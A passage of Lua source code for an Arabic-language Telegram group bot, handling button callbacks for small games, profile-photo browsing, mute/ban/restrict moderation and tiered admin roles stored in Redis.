bot.editMessageText(chat_id,msg_id,msalm, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/mks') then
local UserId = Text:match('(%d+)/mks')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local bain = bot.getUser(data.sender_user_id).first_name
local Textinggt = {"1", "2️", "3",}
local Descriptioont = Textinggt[math.random(#Textinggt)]
if Descriptioont == "1" then
baniusernamek = 'انت : ✂️\n راومو: ✂️\nالنتيجة :  راومو⚖️ '..bain..'\n'
elseif Descriptioont == "2" then
baniusernamek = 'انت : ✂️\n راومو: 🪨️\nالنتيجة : 🏆  راومو🏆\n'
else
baniusernamek = 'انت : ✂️\n راومو: 📄️\nالنتيجة : 🏆 '..bain..' 🏆\n'
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,baniusernamek, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/orka') then
local UserId = Text:match('(%d+)/orka')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local bain = bot.getUser(data.sender_user_id).first_name
local Textinggt = {"1", "2️", "3",}
local Descriptioont = Textinggt[math.random(#Textinggt)]
if Descriptioont == "1" then
baniusernamek = 'انت : 📄️\n راومو: ✂️\nالنتيجة : 🏆  راومو🏆\n'
elseif Descriptioont == "2" then
baniusernamek = 'انت : 📄\n راومو: 🪨️\nالنتيجة : 🏆 '..bain..' 🏆\n'
else
baniusernamek = 'انت : 📄️\n راومو: 📄️\nالنتيجة :  راومو⚖️ '..bain..'\n'
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,baniusernamek, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/hagra') then
local UserId = Text:match('(%d+)/hagra')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local bain = bot.getUser(data.sender_user_id).first_name
local Textinggt = {"1", "2️", "3",}
local Descriptioont = Textinggt[math.random(#Textinggt)]
if Descriptioont == "1" then
baniusernamek = 'انت : 🪨️\n راومو: ✂️\nالنتيجة : 🏆 '..bain..' 🏆\n'
elseif Descriptioont == "2" then
baniusernamek = 'انت : 🪨️\n راومو: 🪨️\nالنتيجة :  راومو⚖️ '..bain..'\n'
else
baniusernamek = 'انت : 🪨️\n راومو: 📄️\nالنتيجة : 🏆  راومو🏆\n'
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo   ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,baniusernamek, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/zog3') then
local UserId = Text:match('(%d+)/zog3')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local bain = bot.getUser(data.sender_user_id)
if bain.first_name then
baniusername = '*مبروك عيني وافق ❤🥳 : *['..bain.first_name..'](tg://user?id='..bain.id..')*\n*'
else
baniusername = 'لا يوجد'
end
bot.editMessageText(chat_id,msg_id,baniusername, 'md', true)
end
end
if Text and Text:match('(%d+)/zog4') then
local UserId = Text:match('(%d+)/zog4')
if tonumber(data.sender_user_id) == tonumber(UserId) then
bot.editMessageText(chat_id,msg_id,"* للاسف رفضك 🥺*","md",true) 
end
end

if Text and Text:match('(%d+)/zog1') then
local UserId = Text:match('(%d+)/zog1')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local bain = bot.getUser(data.sender_user_id)
if bain.first_name then
baniusername = '*مبروك عيني وافقت عليك 🥳 : *['..bain.first_name..'](tg://user?id='..bain.id..')*\n*'
else
baniusername = 'لا يوجد'
end
bot.editMessageText(chat_id,msg_id,baniusername, 'md', true)
end
end
if Text and Text:match('(%d+)/zog2') then
local UserId = Text:match('(%d+)/zog2')
if tonumber(data.sender_user_id) == tonumber(UserId) then
bot.editMessageText(chat_id,msg_id,"* للاسف رفضتك 🥺*","md",true) 
end
end

if Text and Text:match('(%d+)/ban0') then
local UserId = Text:match('(%d+)/ban0')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 0 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban1'},
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban89') then
local UserId = Text:match('(%d+)/ban89')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban_ns = ''
if photo.total_count > 1 then
GH = '* '..photo.photos[2].sizes[#photo.photos[1].sizes].photo.remote.id..'* '
ban = JSON.encode(GH)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
}
https.request("https://api.telegram.org/bot"..Token.."/editMessageMedia?chat_id="..chat_id.."&reply_to_message_id=0&media="..ban.."&caption=".. URL.escape(ban_ns).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban1') then
local UserId = Text:match('(%d+)/ban1')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban2'},{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban0'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[2].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban2') then
local UserId = Text:match('(%d+)/ban2')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban3'},{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban1'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[3].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban3') then
local UserId = Text:match('(%d+)/ban3')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban4'},{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban2'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[4].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban4') then
local UserId = Text:match('(%d+)/ban4')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban5'},{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban3'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[5].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban5') then
local UserId = Text:match('(%d+)/ban5')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban6'},{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban4'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[6].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end
if Text and Text:match('(%d+)/ban6') then
local UserId = Text:match('(%d+)/ban6')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data =data.sender_user_id..'/ban7'},{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban5'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[7].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end

if Text and Text:match('(%d+)/ban7') then
local UserId = Text:match('(%d+)/ban7')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local photo = bot.getUserProfilePhotos(data.sender_user_id)
local ban = bot.getUser(data.sender_user_id)
if photo.total_count > 1 then
local ban_ns = ''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data =data.sender_user_id..'/delAmr'}, 
},
{
{text = '• الصورة السابقة •', callback_data =data.sender_user_id..'/ban0'}, 
},
}
bot.deleteMessages(chat_id,{[1]= msg_id})
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. chat_id .. "&photo="..photo.photos[8].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return bot.sendText(chat_id,msg_id,'*• لا توجد صور في حسابك*',"md",true) 
end
end
end

if Text and Text:match('(%d+)mute(%d+)') then
local UserId = {Text:match('(%d+)mute(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
redis:sadd(bot_id..":"..chat_id..":silent",replyy)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء كتمه', data = data.sender_user_id..'unmute'..replyy}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
local TextHelp = Reply_Status(replyy,"↯︙تم كتمه في المجموعة ").helo
bot.editMessageText(chat_id,msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)unmute(%d+)') then
local UserId = {Text:match('(%d+)unmute(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
redis:srem(bot_id..":"..chat_id..":silent",replyy)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
local TextHelp = Reply_Status(replyy,"↯︙تم الغاء  كتمه ").helo
bot.editMessageText(chat_id,msg_id,TextHelp, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)ban(%d+)') then
local UserId = {Text:match('(%d+)ban(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
bot.setChatMemberStatus(chat_id,replyy,'banned',0)
redis:sadd(bot_id..":"..chat_id..":Ban",replyy)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء حظره', data = data.sender_user_id..'unban'..replyy}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
local TextHelp = Reply_Status(replyy,"↯︙تم حظرة ").helo
bot.editMessageText(chat_id,msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)unban(%d+)') then
local UserId = {Text:match('(%d+)unban(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
redis:srem(bot_id..":"..chat_id..":Ban",replyy)
bot.setChatMemberStatus(chat_id,replyy,'restricted',{1,1,1,1,1,1,1,1,1})
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
local TextHelp = Reply_Status(replyy,"↯︙تم لغيت حظره ").helo
bot.editMessageText(chat_id,msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)kid(%d+)') then
local UserId = {Text:match('(%d+)kid(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
bot.setChatMemberStatus(chat_id,replyy,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..chat_id..":restrict",replyy)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء تقييده', data = data.sender_user_id..'unkid'..replyy}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
local TextHelp = Reply_Status(replyy,"↯︙تم قيدته ").helo
bot.editMessageText(chat_id,msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)unkid(%d+)') then
local UserId = {Text:match('(%d+)unkid(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
redis:srem(bot_id..":"..chat_id..":restrict",replyy)    
bot.setChatMemberStatus(chat_id,replyy,'restricted',{1,1,1,1,1,1,1,1,1})
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
local TextHelp = Reply_Status(replyy,"↯︙تم لغيت تقييده ").helo
bot.editMessageText(chat_id,msg_id,TextHelp, 'md', true, false, reply_markup)
end
end

if Text and Text:match('/Mahibes(%d+)') then
local GetMahibes = Text:match('/Mahibes(%d+)') 
local NumMahibes = math.random(1,6)
if tonumber(GetMahibes) == tonumber(NumMahibes) then
redis:incrby(bot_id..":"..data.chat_id..":"..data.sender_user_id..":game", 1)  
MahibesText = '* • الف مبروك حظك حلو اليوم\n• فزت وطلعت المحيبس بل عظمه رقم {'..NumMahibes..'}*'
else
MahibesText = '* • للاسف لقد خسرت المحيبس بالعظمه رقم {'..NumMahibes..'}\n• جرب حضك مره اخرى*'
end
if NumMahibes == 1 then
Mahibes1 = '🤚' else Mahibes1 = '👊'
end
if NumMahibes == 2 then
Mahibes2 = '🤚' else Mahibes2 = '👊'
end
if NumMahibes == 3 then
Mahibes3 = '🤚' else Mahibes3 = '👊' 
end
if NumMahibes == 4 then
Mahibes4 = '🤚' else Mahibes4 = '👊'
end
if NumMahibes == 5 then
Mahibes5 = '🤚' else Mahibes5 = '👊'
end
if NumMahibes == 6 then
Mahibes6 = '🤚' else Mahibes6 = '👊'
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '𝟏 » { '..Mahibes1..' }', data = '/*'}, {text = '𝟐 » { '..Mahibes2..' }', data = '/*'}, 
},
{
{text = '𝟑 » { '..Mahibes3..' }', data = '/*'}, {text = '𝟒 » { '..Mahibes4..' }', data = '/*'}, 
},
{
{text = '𝟓 » { '..Mahibes5..' }', data = '/*'}, {text = '𝟔 » { '..Mahibes6..' }', data = '/*'}, 
},
{
{text = '{ العب مره اخرى }', data = '/MahibesAgane'},
},
}
}
return bot.editMessageText(chat_id,msg_id,MahibesText, 'md', true, false, reply_markup)
end
if Text == "/MahibesAgane" then
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '𝟏 » { 👊 }', data = '/Mahibes1'}, {text = '𝟐 » { 👊 }', data = '/Mahibes2'}, 
},
{
{text = '𝟑 » { 👊 }', data = '/Mahibes3'}, {text = '𝟒 » { 👊 }', data = '/Mahibes4'}, 
},
{
{text = '𝟓 » { 👊 }', data = '/Mahibes5'}, {text = '𝟔 » { 👊 }', data = '/Mahibes6'}, 
},
}
}
local TextMahibesAgane = '*• لعبه المحيبس هي لعبة الحظ \n• جرب حظك مع البوت\n• كل ما عليك هو الضغط على احدى العضمات في الازرار*'
return bot.editMessageText(chat_id,msg_id,TextMahibesAgane, 'md', true, false, reply_markup)
end
----------------------------------------------------------------------------------------------------------

if tonumber(data.sender_user_id) == 1342680269 then
data.The_Controller = 1
elseif tonumber(data.sender_user_id) == 1342680269 then
data.The_Controller = 1
elseif devB(data.sender_user_id) == true then  
data.The_Controller = 1
elseif redis:sismember(bot_id..":Status:programmer",data.sender_user_id) == true then
data.The_Controller = 2
elseif redis:sismember(bot_id..":Status:developer",data.sender_user_id) == true then
data.The_Controller = 3
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", data.sender_user_id) == true then
data.The_Controller = 44
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", data.sender_user_id) == true then
data.The_Controller = 4
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", data.sender_user_id) == true then
data.The_Controller = 5
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", data.sender_user_id) == true then
data.The_Controller = 6
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", data.sender_user_id) == true then
data.The_Controller = 7
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", data.sender_user_id) == true then
data.The_Controller = 8
elseif tonumber(data.sender_user_id) == tonumber(bot_id) then
data.The_Controller = 9
else
data.The_Controller = 10
end  
if data.The_Controller == 1 then  
data.ControllerBot = true
end
if data.The_Controller == 1 or data.The_Controller == 2 then
data.DevelopersQ = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 then
data.Developers = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 9 then
data.TheBasicsQ = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 9 then
data.TheBasics = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 9 then
data.Originators = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 9 then
data.Managers = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 9 then
data.Addictive = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 8 or data.The_Controller == 9 then
data.Distinguished = true
end

if Text and Text:match('(%d+)/statusTheBasicsz/(%d+)') and data.TheBasicsQ then
local UserId = {Text:match('(%d+)/statusTheBasicsz/(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", UserId[2]) then
redis:srem(bot_id..":"..chat_id..":Status:BasicConstructor", UserId[2])
else
redis:sadd(bot_id..":"..chat_id..":Status:BasicConstructor", UserId[2])
end
return editrtp(chat_id,UserId[1],msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusOriginatorsz/(%d+)') and data.TheBasics then
local UserId = {Text:match('(%d+)/statusOriginatorsz/(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if redis:sismember(bot_id..":"..chat_id..":Status:Constructor", UserId[2]) then
redis:srem(bot_id..":"..chat_id..":Status:Constructor", UserId[2])
else
redis:sadd(bot_id..":"..chat_id..":Status:Constructor", UserId[2])
end
return editrtp(chat_id,UserId[1],msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusManagersz/(%d+)') and data.Originators then
local UserId = {Text:match('(%d+)/statusManagersz/(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if redis:sismember(bot_id..":"..chat_id..":Status:Owner", UserId[2]) then
redis:srem(bot_id..":"..chat_id..":Status:Owner", UserId[2])
else
redis:sadd(bot_id..":"..chat_id..":Status:Owner", UserId[2])
end
return editrtp(chat_id,UserId[1],msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusAddictivez/(%d+)') and data.Managers then
local UserId = {Text:match('(%d+)/statusAddictivez/(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if redis:sismember(bot_id..":"..chat_id..":Status:Administrator", UserId[2]) then
redis:srem(bot_id..":"..chat_id..":Status:Administrator", UserId[2])
else
redis:sadd(bot_id..":"..chat_id..":Status:Administrator", UserId[2])
end
return editrtp(chat_id,UserId[1],msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusDistinguishedz/(%d+)') and data.Addictive then
local UserId = {Text:match('(%d+)/statusDistinguishedz/(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if redis:sismember(bot_id..":"..chat_id..":Status:Vips", UserId[2]) then
redis:srem(bot_id..":"..chat_id..":Status:Vips", UserId[2])
else
redis:sadd(bot_id..":"..chat_id..":Status:Vips", UserId[2])
end
return editrtp(chat_id,UserId[1],msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusmem/(%d+)') and data.TheBasicsQ then
local UserId ={ Text:match('(%d+)/statusmem/(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
redis:srem(bot_id..":"..chat_id..":Status:Constructor", UserId[2])
redis:srem(bot_id..":"..chat_id..":Status:BasicConstructor", UserId[2])
redis:srem(bot_id..":"..chat_id..":Status:Owner", UserId[2])
redis:srem(bot_id..":"..chat_id..":Status:Administrator", UserId[2])
redis:srem(bot_id..":"..chat_id..":Status:Vips", UserId[2])
return editrtp(chat_id,UserId[1],msg_id,UserId[2])
end
end

if Text and Text:match('/delAmr1') then
local UserId = Text:match('/delAmr1')
if data.Addictive then
return bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

----------------------------------------------------------------------------------------------------------
if Text and Text:match('/delAmr') then
local UserId = Text:match('/delAmr')
return bot.deleteMessages(chat_id,{[1]= msg_id})
end

if Text and Text:match('(%d+)/groupNumseteng//(%d+)') then
local UserId = {Text:match('(%d+)/groupNumseteng//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
return GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id)
end
end
if Text and Text:match('(%d+)/groupNum1//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum1//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(chat_id,UserId[2]).change_info) == 1 then
bot.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه تغيير المعلومات", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,'❬ ❌ ❭',nil,nil,nil,nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,0, 0, 0, 0,0,0,1,0})
else
bot.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه تغيير المعلومات", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,'❬ ✔️ ❭',nil,nil,nil,nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,1, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum2//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum2//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(chat_id,UserId[2]).pin_messages) == 1 then
bot.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه التثبيت", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,'❬ ❌ ❭',nil,nil,nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,0, GetAdminsNum(chat_id,UserId[2]).promote})
else
bot.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه التثبيت", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,'❬ ✔️ ❭',nil,nil,nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, GetAdminsNum(chat_id,UserId[2]).restrict_members ,1, GetAdminsNum(chat_id,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum3//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum3//(%d+)')}
if tonumber(data.sender_user_id) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(chat_id,UserId[2]).restrict_members) == 1 then
bot.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه الحظر", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,'❬ ❌ ❭',nil,nil,nil)
bot.setChatMemberStatus(chat_id,UserId[2],'administrator',{0 ,GetAdminsNum(chat_id,UserId[2]).change_info, 0, 0, GetAdminsNum(chat_id,UserId[2]).delete_messages, GetAdminsNum(chat_id,UserId[2]).invite_users, 0 ,GetAdminsNum(chat_id,UserId[2]).pin_messages, GetAdminsNum(chat_id,UserId[2]).promote})
else
bot.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه الحظر", true)
GetAdminsSlahe(chat_id,UserId[1],UserId[2],msg_id,nil,nil,'❬ ✔️ ❭',nil,nil,nil)
